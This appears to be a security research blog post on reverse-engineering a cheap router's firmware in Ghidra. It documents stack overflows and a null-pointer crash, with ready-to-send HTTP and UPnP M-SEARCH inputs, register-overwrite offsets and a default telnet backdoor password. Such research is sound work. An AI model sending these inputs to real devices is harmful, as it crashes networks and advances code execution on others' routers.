---
published: true
title : "📡 Analysing a Dirt-cheap Router [2] : Finding Bugs"
toc: true
toc_sticky: true
categories:
  - VR
tags:
  - Reverse Engineering
  - Ghidra
  - Pointer Issues
  - Memory Corruption
tagline: "In the last blog, we uncovered an exposed telnet backdoor that is enabled by default. We also reversed some of the HTTP functionality to allow us to change whatever config value we please. Using the UART, we also extracted the firmware and loaded it into Ghidra. The next goal is code execution - but we are going to need to find some bugs to get there."
excerpt : "Now that we've got a way in, it's time to get into the firmware and see if some less-obvious security issues manifest."
header:
  teaser: /assets/images/analysing_a_dirt_cheap_router/mcu.jpg
  overlay_image: /assets/images/analysing_a_dirt_cheap_router/mcu.jpg
  overlay_filter: 0.4
  #caption: "Photo credit: [**Unsplash**](https://unsplash.com)"
---

# What is a buffer overflow?

As most of the observed issues are buffer overflows, it would be a good idea to describe what they are and how they work. To put it into a single sentence, it is when a buffer is filled with more data than it can handle, therefore overflowing and writing adjacent contents on either the stack or the heap memory. Buffer overflows can cause crashes, and can also be leveraged to gain code execution on the device running the affected code.

![buffer-overflow-illustration.png](/assets/images/analysing_a_dirt_cheap_router_part_2/buffer-overflow-illustration.png)

In terms of stack overflows, these are pretty easy to exploit. If you overflow a buffer on the stack, at some point you will eventually overwrite the return address of the function. This means you can modify the flow of the function to go wherever you want. If there are no mitigations, you can generate 'shellcode' (named because it is usually used to pop a shell) to get code execution, you just need to jump to the start of your shellcode. You can also use ROP but thats a whole other story.

![buffer_overflow_attack.png](/assets/images/analysing_a_dirt_cheap_router_part_2/buffer_overflow_attack.png)

# Finding Interesting Functions

Most bugs in embedded system firmware written in C/C++ will be a result of using unsafe functions such as strcpy, sprintf, etc. Our binary doesn't have symbols, which means none of these functions are identifiable - so we need to find them. 

In Ghidra, you can write scripts using the Ghidra scripting API, there are loads of scripts out there that can do some really interesting things. We would like a script that automatically identifies some functions that are of interest to us. 

I found a repository of [useful Ghidra scripts](https://github.com/tacnetsol/ghidra_scripts), which are ports of IDA plugins to Ghidra. There are some 'LeafBlower' scripts, which identify functions the binary that may handle strings/char arrays - these will be useful. 

Here are the outputs of the scripts:

![leafblowerformat.png](/assets/images/analysing_a_dirt_cheap_router_part_2/leafblowerformat.png)

![leafblowerstring.png](/assets/images/analysing_a_dirt_cheap_router_part_2/leafblowerstring.png)

The functions have been named after-the-fact, some of them were quite simple to identify, others were worked out with slight assistance from ChatGPT (I ❤ AI). With these functions identified, we can work our way back from the calls and see if they are used in an unsafe manner.

# Post-auth Config Stack Overflows

This section covers some overflows resulting from our arbitrary config modification via HTTP we found in the last blog.

## Locating Config Functions

Lets start with what we know, and see if we can find some bugs in the config handling. We know that loads of these values are being pulled from the config when the device starts up, maybe we can use our config modification trick from the last blog to trigger some bugs?

Before we can do any of this, we need to identify the functions that manipulate the config in the binary. Thanks to the debug menu, this is pretty simple. 

The function that gets values from the config is at address *0x80009590*, and has cases for each of the types (*int, string, ip, mac*). Below shows an example string retrieval into a buffer on the stack:

![config_get_str.png](/assets/images/analysing_a_dirt_cheap_router_part_2/config_get_str.png)

The *set* function is located at address *0x80008d9c*, but we are only really worried about the *get* function for now.

## Config Get

If we look closer at the config *get* function and take a look at the function at address *0x800084c4* (which seems to interact with the config directly), we can see that the string retrieval component can get up to 256 bytes. So if we can set a string to be the full 256 bytes, and this string is loaded into a buffer smaller than this (and isn't behind other stuff on the stack), we should have an easy win.

```
-c
undefined4 pull_from_cfg(int **some_global,int id,int dest) {
  uint len;
  uint type;
  ...
  
  piVar4 = *some_global;
  piVar3 = (int *)((int)piVar4 + (int)some_global[2]);
  if ((piVar4 < piVar3) && (iVar1 = *piVar4, iVar1 != -1)) {
    uVar5 = piVar4[1];
    len = uVar5 & 0xfffffffc;
    if (len < 0x101) {
      do {
        if (id == iVar1) {
          type = id >> 8 & 0xff;
          if (type == 2) {
            uVar2 = strlen(piVar4 + 2);
            ...
            memcpy(dest,piVar4 + 2, uVar2);
            return 0;
          }
          ...
      } while (len < 0x101);
    }
  }
  return 0xffffffff;
}
```

## Config Bugs

I ended up finding five possible instances of a string being loaded into too small a buffer, and two of these ended up triggering crashes.

### *WLN_SSID1* Stack-based Buffer Overflow

The vulnerable function is located at *0x80003948*, the overflow is pretty clear in the following snippet:

```
-c
undefined4 WLN_SSID1_overflow(void) {
  ...
  undefined auStack_50 [64];
  ...
  memset(auStack_50,0,0x40);
  ...
  config_get(0x43c0200,auStack_50);
  iVar3 = strcmp(auStack_50,s_black_CaryStudio_801af27c);
  if (iVar3 == 0) {
    sprintf(&local_a0,s_black_%02X%02X_801af290,local_6a,local_69);
  }
  else {
    ...
  }
  config_set_value(0x43c0200,&local_a0);
  FUN_80009b58(2);
  FUN_800035c4(2);
LAB_80003a3c:
  FUN_801aa6c0(iVar2);
  return 0;
}
```

We can see the *WLN_SSID1* (*0x43c0200*) being pulled from the config into a buffer of 64 bytes at the top of the stack, which means it can be used to trigger an overflow. Sending the following payload to the router sets the *WLN_SSID1* value to a large value:

```
-http
POST /do_cmd.htm HTTP/1.1
Authorization: Basic YWRtaW46YWRtaW4=
Content-Type: application/x-www-form-urlencoded
Content-Length: 224

CMD=SYS&SET0=71041536%3DAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
```

This function is called when the router is booted from an unpowered state, so when the router is restarted, the following crash is observed:

```
Except 2: TLBL
    z0=00000000 at=fffffffe v0=00000000 v1=00000000
    a0=80260000 a1=00000000 a2=00000000 a3=00000000
    t0=1000e401 t1=80808080 t2=01010101 t3=00000001
    t4=00000000 t5=0000000b t6=0000000f t7=802b7ccc
    s0=63413163 s1=33634132 s2=41346341 s3=11110013
    s4=11110014 s5=11110015 s6=11110016 s7=11110017
    t8=802b5a00 t9=8023b430 k0=80260000 k1=11110014
    gp=80269a60 sp=802b7e98 fp=802b7f20 ra=63413563
    pc=63413563 sr=1000e403 cause=10000008, badva=63413562
```

The register values are located at the following offsets:

| Register | Offset |
|-|-|
| *s0* | 64 |
| *s1* | 68 |
| *s2* | 72 |
| *ra* | 76 |

So we've found a bug, but it is a terrible bug. It requires a full restart to trigger the overflow, it requires the admin password to set *WLN_SSID1*, and it breaks the config - preventing the router from booting (until the default config is reloaded via uboot).

### *RT_ADD* Stack-based Buffer Overflow

The next viable option for config value overflows is the *RT_ADD* HTTP command, the handler for this is located at address *0x8000ee88*. When this command is received (*CMD=RT_ADD* in HTTP payload), the value at config ID *0x5010201* (assuming it is named *RT_ADD*, but it is not named in the config) is loaded into a small 104 byte buffer on the top of the stack:

```
-c
int bof_1_RT_ADD(undefined4 param_1) {
  char *pcVar1;
  char *pcVar2;
  int iVar3;
  int iVar4;
  int id;
  undefined read_from_cfg [104];
  
  pcVar1 = (char *)lm_substring_find(param_1,s_monitor_cmd_801e3bd4 + 8);
  if (pcVar1 == (char *)0x0) {
    pcVar1 = s_===>_%s_(value=%d)_801d7804 + 0x14;
  }
  pcVar2 = (char *)lm_substring_find(param_1,s_str_801b3034);
  if (pcVar2 == (char *)0x0) {
    pcVar2 = s_===>_%s_(value=%d)_801d7804 + 0x14;
  }
  iVar3 = str_to_int_maybe(pcVar1,0,10);
  if (iVar3 == 1) {
    id = 0x5010201;
    iVar3 = 0;
    while (iVar4 = lm_load_from_config(id,read_from_cfg), iVar4 != -1) {
      iVar4 = strcmp(pcVar2,read_from_cfg);
      if (iVar4 == 0) {
        config_del(id);
        iVar3 = FUN_80124c4c(pcVar2);
        id = id + 1;
      }
      else {
        id = id + 1;
      }
    }
  }
  else {
    iVar3 = 0x5010201;
    do {
      iVar4 = iVar3;
      id = lm_load_from_config(iVar4,read_from_cfg);
      iVar3 = iVar4 + 1;
    } while (id != -1);
    iVar3 = FUN_80124c54(pcVar2);
    if (iVar3 == -1) {
      return -1;
    }
    config_set_value(iVar4,pcVar2);
  }
  if (iVar3 == 0) {
    iVar3 = 1;
  }
  return iVar3;
}
```

There are two points where the config value at ID *0x5010201* is loaded into the small buffer, I am unsure which one is being called (due to the very limited crash dump of the router), but either path leads to the overflow. 

A good thing about this bug, is that it can be triggered instantly with 2 authenticated HTTP commands. The first command simply sets the *0x5010201* to a large string:

```
-http
POST /do_cmd.htm HTTP/1.1
Authorization: Basic YWRtaW46YWRtaW4=
Content-Type: application/x-www-form-urlencoded
Content-Length: 246

CMD=LANGUAGE_TYPE&GO=time.htm&SET0=83952129%3DAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
```

The second calls the *RT_ADD* HTTP command to trigger the overflow: 

```
-http
POST /do_cmd.htm HTTP/1.1
Authorization: Basic YWRtaW46YmlnY2h1bmd1cw==
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

CMD=RT_ADD
```

The following crash dump is observed when this happens:

```
Except 2: TLBL
    z0=00000000 at=fffffffe v0=ffffffff v1=00000001
    a0=8026e928 a1=8026e8e0 a2=0000003b a3=00000008
    t0=8026e92d t1=00000001 t2=0000000a t3=00000007
    t4=802b5a08 t5=00000059 t6=00000044 t7=802b5c08
    s0=35644134 s1=41366441 s2=64413764 s3=39644138
    s4=41306541 s5=8026eb54 s6=00000000 s7=8026eb54
    t8=802b5a00 t9=801329d0 k0=00000000 k1=00000000
    gp=80269a60 sp=8026ea20 fp=00000000 ra=65413165
    pc=65413165 sr=1000e403 cause=10000008, badva=65413164
```

Here are the string offsets for each overwritten register:

| Register | Offset |
|-|-|
| *s0* | 104|
| *s1* | 108 |
| *s2* | 112 |
| *s3* | 116 |
| *s4* | 120 |
| *ra* | 124 |

This bug is an improvement over the previous bug because the router doesn't need to be restarted to trigger it, however it still requires the admin password, and breaks the config.

![config_meme.jpg](/assets/images/analysing_a_dirt_cheap_router_part_2/config_meme.jpg)

## Config Fixing

When the config values are updated to the malicious values, and the router is reset, it gets stuck in a constant state of crashing. I am not 100% sure why this happens with the *RT_ADD* value, but the *WLN_SSID1* is loaded on boot which causes the crash.

When the router is booted, the UART output can be used to interact with the uboot bootloader that runs on the router before the main OS is loaded.  It presents several options via the UART during the boot sequence:

![uboot.png](/assets/images/analysing_a_dirt_cheap_router_part_2/uboot.png)

We will use option four, as this will allow us to access the **spi** command, allowing us to fix our broken config. 

The config is stored on the flash at address *0x31000*, so we can use the **spi read 0x31000 5000** command to view the entire config (you can see the string of lots of a's that broke the config highlighted in red):

![broken_cfg.png](/assets/images/analysing_a_dirt_cheap_router_part_2/broken_cfg.png)

After messing with the **read** command, I discovered that if you erase any part of the config, it just wipes the entire config. Reading any part of the config on the flash will just result in *0xff*'s. I'm not entirely sure why this happens. 

However, on the next boot, the router notices the config is missing from the flash, and so it loads the default config back onto it - fixing the router. So anytime this boot issue occurs, I just use the **spi erase 31c80 1** to wipe the config, and the issue is fixed!

# Pre-auth HTTP Null Pointer Dereferences

In the HTTP message handling, they do some processing on the incoming message to check for the presence of various *Host*/*User-Agent* names in the incoming packet headers:

```
-c
...
result = strskip(user_agent,s_Mozilla_801b36b0);
if ((result != 0) &&
    (((result = strskip(user_agent,s_Firefox_801b36b8), result != 0 &&
      (result = strskip(host,s_Firefox_801b36b8 + 4), result != 0))
    || ((result = strskip(user_agent,s_QIHU_801b36c0), result != 0 &&
        (result = strskip(host,s_360_801b36c8), result != 0))))))
goto LAB_80011324;
...
```

The *strskip* function is also seen below:

```
-c
char * strskip(char *input,char *target) {
  char *pcVar1;
  int iVar2;
  char *pcVar3;
  
  iVar2 = 0;
  pcVar1 = target;
  if (*input == '\0') {
    if (*target != '\0') {
      return (char *)0x0;
    }
  }
  else {
    while( true ) {
      pcVar3 = input + iVar2;
      iVar2 = iVar2 + 1;
      if (*pcVar1 == '\0') break;
      if (*pcVar3 != *pcVar1) {
        input = input + 1;
        iVar2 = 0;
        if (*input == '\0') {
          return (char *)0x0;
        }
      }
      pcVar1 = target + iVar2;
    }
  }
  return input;
}
```

This function skips over a particular substring *target* within a larger string *input*, returning a pointer to the character immediately after the end of the *target* substring. If the *target* substring is not found within the input string, the function returns a null pointer.

In the code snippet above that utilises *strskip*, it first finds the '*Mozilla*' string in the **User-Agent** header. If it is found, it then also checks for presence of '*Firefox*' - failing this, it also checks for '*QIHU*'. 

Earlier on, the *host* variable was allocated the address of the string following the **Host** HTTP parameter. E.g., if the header contained **Host: SomeHost**, *host* would point to **SomeHost**.

If we send a HTTP packet without the **Host** parameter that contains the 'Mozilla' and '*Firefox*'/'*QIHU*' strings in the **User-Agent** header, then the next *strskip* call will cause the program to crash, as the value of *host* is null (because we didn't send a **Host** parameter). They incorrectly assume the presence of a **Host** header. This leads to a crash as at the start of *strskip*, it is checked if the target points to a null terminator by dereferencing the pointer. Dereferencing a null pointer = crash.

The following HTTP packets will cause the router to crash, making the router useless until a full restart occurs:

```
-http
GET / HTTP/1.1
User-Agent: MozillaFirefox
```

```
-http
GET / HTTP/1.1
User-Agent: MozillaQIHU
```

We can also see the null value in *a0* which causes the crash, *0x801b36bc* is the address of the '360' string (result of the second HTTP payload):

```
Except 2: TLBL
    z0=00000000 at=fffffffe v0=8046f7ce v1=00000005
    a0=00000000 a1=801b36c8 a2=00000000 a3=8046f7d2
    t0=00000023 t1=8046f7c5 t2=801b36a2 t3=000007f8
    t4=802b5a08 t5=00000058 t6=00000013 t7=802b5a80
    s0=8046f7c7 s1=00000024 s2=0000000a s3=801b3644
    s4=8046f7b0 s5=801b3634 s6=801b3648 s7=8026eb54
    t8=802b5a00 t9=801329d0 k0=8026ef2c k1=000007dc
    gp=80269a60 sp=8026eb50 fp=8026ef08 ra=80011558
    pc=801a7540 sr=1000e403 cause=00000008, badva=00000000
```

This means that any unauthenticated user on the network is able to crash the router with a single HTTP command, which isn't ideal.

# Pre-auth UPNP Stack-based Buffer Overflows

After staring at the HTTP server for a while, I wanted a change of scenery, so I turned my attention to the UPNP service running on the router. 

## What is UPnP?

Basically, UPnP (Universal Plug and Play) is a group of networking protocols that make it easier to find and communicate with devices on a local network. It allows devices to automatically discover and connect to one another. One of the used methods is called M-SEARCH, which is used for device discovery. In addition to M-SEARCH, UPnP also uses protocols like HTTP and SOAP to communicate between devices.

## M-SEARCH

UPnP uses a method called M-SEARCH for device discovery. When a device is added to the network, it sends an M-SEARCH message that essentially asks other devices if they can work together. Devices on the network that support UPnP respond to the message by sharing information about their capabilities, such as what services they offer and how to connect to them. This allows the new device to quickly find and communicate with other devices on the network.

The M-SEARCH packet looks like this:

| Line | Comment|
| - | - |
| M-SEARCH * HTTP/1.1 | Method_Target_HTTP/Version |
| HOST: 239.255.255.250:1900 | Destination address and port |
| MAN: "ssdp:discover" | Mandatory - Indicates the message is a UPnP discovery request |
| MX: 2 | Maximum Wait Time - How long devices on network should wait before responding |
| ST: ssdp:all | Search Target - Where the messages are going |

## Getting the Crash

I found the M-SEARCH handler function at address *0x8018a788* by searching for strings in the packet described above. A *strcpy* in this function caught my eye immediately as it seemed to be copying the "*uuid*" within the incoming request into a 132 byte buffer with no length checks. The "uuid" is a part of the request, so we should be able to control it. 

Sending the following request caused the device to crash, all we had to do was alter the ST header and add the large "*uuid*" parameter:

```
M-SEARCH * HTTP/1.1
HOST:239.255.255.250:1900
MAN:"ssdp:discover"
MX:3
ST:uuid:Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar

```

Here is the state of the registers after the crash:

```
Except 2: TLBL
    z0=00000000 at=fffffffe v0=00000000 v1=00000041
    a0=801f0000 a1=8025d521 a2=801ec064 a3=00000000
    t0=80260000 t1=801eb0e4 t2=00000001 t3=00000251
    t4=0000000a t5=0000000d t6=802c5504 t7=00000020
    s0=41346541 s1=65413565 s2=37654136 s3=41386541
    s4=801ef724 s5=11110015 s6=11110016 s7=11110017
    t8=ffffffed t9=00000012 k0=00000000 k1=00000000
    gp=80269a60 sp=802ab9c0 fp=802aba20 ra=66413965
    pc=66413965 sr=1000e403 cause=10000008, badva=66413964
```

And here are the offsets of the data loaded into the registers:

| Register | Offset |
| - | - |
| *s0* | 132 |
| *s1* | 136 |
| *s2* | 140 |
| *s3* | 144 |
| *ra* | 148 |

## More Crashes

It turns out that this buffer is used in multiple calls to *memcpy*, where the length is calculated using a version of *strpbrk*. The *strpbrk* function finds any occurrences of characters in a string, returning the index of the character if one is found. 

As it is used in this function, it takes the *ST* parameter and tries to see if any default UPnP strings are present, *urn:schemas-wifialliance-org:device:* for example. If one of these strings is found, it uses *strpbrk* to find the next ':' character, returning the index of the character if it is found. This index is then used as the number of bytes to copy from the *ST* parameter into the 132 byte stack buffer we saw earlier. 

Therefore, if we provide one of these default strings, add a large number of bytes, and then add a ':' at the end, we trigger another overflow into the same buffer. Technically there are two distinct *memcpy* calls with different default strings, but I'll only count this as a single bug (it is also pretty similar to the previous bug, it copies to the same buffer after all).

Here are the four ST values that will trigger the overflow - the rest of the message is identical to the message used to trigger the other *uuid* bug:
- **ST:urn:schemas-upnp-org:device:aaaaa...aaaaa:**
- **ST:urn:schemas-upnp-org:service:aaaaa...aaaaa:**
- **ST:urn:schemas-wifialliance-org:service:aaaaa...aaaaa:**
- **ST:urn:schemas-wifialliance-org:device:aaaaa...aaaaa:**

Here is the code, I've colour coded the default values and their corresponding *memcpy* calls (as well as the *strcpy* mentioned earlier):

![upnp_bugs.png](/assets/images/analysing_a_dirt_cheap_router_part_2/upnp_bugs.png)

# Honourable Mention - NTP_SRV Stack-based Buffer Overflow

I haven't been able to test that this bug is useful/works, as I believe the router checks that it has an internet connection before it sends any NTP requests (which I do not want to provide it with!). I've been able to get it to call the **ntp_update** function, but never the actual function that sends the request and handles the response.

In the config, you can provide up to three possible NTP servers that the router can use to update its time. In the config, these are separated by '*', like so: **addr1.com*addr2.com*addr3.com**. The code that reads these addresses from the config is seen below:

```
-c
...
char local_6cc [192];
char some_buffer [40];
uint local_5e4;
char *local_30;

local_30 = some_buffer;
server_name = local_6cc;
memset(local_30,0,0x5dc);
memset(server_name,0,0xc0);
cVar8 = *param_1;
iVar11 = 0;
if (cVar8 != '\0') {
  iVar10 = 0;
  do {
    while (cVar8 != '*') {
      local_6cc[iVar10 + iVar11 * 0x40] = cVar8;
      param_1 = param_1 + 1;
      cVar8 = *param_1;
      iVar10 = iVar10 + 1;
      if (cVar8 == '\0') goto LAB_80195d84;
    }
    param_1 = param_1 + 1;
    cVar8 = *param_1;
    iVar11 = iVar11 + 1;
    iVar10 = 0;
  } while (cVar8 != '\0');
}
...
```

This code uses null terminators to identify when the string has ended, and takes no consideration of how many '\*' have been seen. *Local_6cc* is a 192 byte buffer, and the number of observed '\*' symbols is multiplied by *0x40* to get the offset in the buffer the server address should be copied. 

If a string such as **a*b*c*d*e*f*g*h*** is set to be the *SYS_NTPSRV* config value, then characters after **c** should be written outside of the allocated buffer on the stack. The length of each individual URL is also not checked, so in combination about 250 bytes of the config string would be useful in an exploit (which is far better than the other config bugs we discovered earlier).

# Bug Summary

| Type | Description |
| - | - | 
| Pre-auth Telnet Backdoor | A telnet backdoor with default password of 'cs2012' is enabled by default on the router, exposing the eCos CLI running on the router. |
| Post-auth Arbitrary Config Modification | By reversing the ID's of various config values on the router, it is possible to modify any value in the config used by the device via an authenticated HTTP request. |
| Post-auth Stack Overflow | By setting the value of *WLN_SSID1* to a large string in the config and restarting the router, a stack-based buffer overflow occurs. |
| Post-auth Stack Overflow | If the value of *RT_ADD* in the config is set to a large string, and a HTTP *RT_ADD* is sent to the router, a stack-based buffer overflow occurs. |
| Pre-auth Null Pointer Dereference | Due to an assumption in the HTTP handler that a *Host* header will be present, a null pointer dereference occurs when a specific *User-Agent* header is sent, leading to a system crash. |
| Pre-auth *strcpy* Stack Overflow | In the UPnP M-SEARCH message handler, and unsafe *strcpy* call is used which causes a stack-based buffer overflow if a large *uuid* value is sent. |
| Pre-auth *memcpy* Stack Overflow | In the UPnP M-SEARCH message handler, a combination of a *strpbrk* call to obtain an unchecked length used by a *memcpy* call causes a stack-based buffer overflow if a specially crafted *ST* value is sent. |

# Conclusion

Overall, this was a pretty good result, we found plenty of interesting bugs. Not only is there a telnet backdoor that can be accessed without the admin password, but the pre-auth issues can also allow an attacker to execute code and crash the router if they are on the network!

In part 3, we will attempt to exploit the UPnP overflow in order to gain remote code execution, and hopefully get the router to do something interesting for us.
